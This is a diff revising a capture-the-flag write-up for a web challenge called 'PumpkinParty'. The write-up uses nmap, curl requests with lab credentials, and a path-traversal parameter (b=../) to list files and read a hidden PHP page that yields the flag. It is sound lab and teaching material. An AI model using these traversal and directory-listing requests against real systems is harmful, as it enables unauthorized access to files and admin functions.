@@ -1,5 +1,5 @@
 ## PumpkinParty
-After we launched the container, we got an ip for the host. Let's call it `$HOSTIP`.
+When we launch the container, we get an ip for the host. Let's call it `$HOSTIP`.
 
 With `nmap $HOSTIP` we find out the host only listens on port 80.
 
@@ -31,7 +31,6 @@ returns a page with a table where the order is summarized. There's a button that
 
 Let's send a request:
 
-
     curl -iv -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://$HOSTIP/tickets.php?action=buy
 
 We get a page with an HTML comment saying:
@@ -54,11 +53,12 @@ merchant.
 
     ["Bobs Bar","Himalaya Hats","Ingrids Imbiss"]
 
-What happens if we replace the value `registered` with something else, say, a dot?
+What happens if we replace the value `registered` with something else, say, a
+dot for the current directory?
 
     curl -u merch_test2:BUYMYSHORTS http://$HOSTIP/merchants/processor.php?a=.
 
-It yields a list of filenames:
+It yields an array of filenames:
 
     [".htaccess",".htpasswd","327a6c4304ad5938eaf0efb6cc3e53dc.php","index.php","processor.php","registered"]
 
@@ -75,12 +75,13 @@ Since the JavaScript code sends requests to
 to be file, we could get the suspicious file this way.
 
 `processor.php` outputs files given in parameter `b` which are in the directory
-`registered`. Since `327a6c4304ad5938eaf0efb6cc3e53dc.php` is in a directory above `registered` we need to send
+`registered`. Since `327a6c4304ad5938eaf0efb6cc3e53dc.php` is in the directory
+above `registered` we need to send
 
-    curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php
+    curl -u merch_test2:BUYMYSHORTS http://$HOSTIP/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php
 
 The PHP file asks for a GET parameter `admin` that must have the value `sure`. So let's do the request
 
-    curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure
+    curl -u merch_test2:BUYMYSHORTS http://$HOSTIP/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure
 
 The returned HTML page contains the flag: `DORF18{Y0UR_5H3LL_15_1N_4N0TH3R_C45TL3}`.
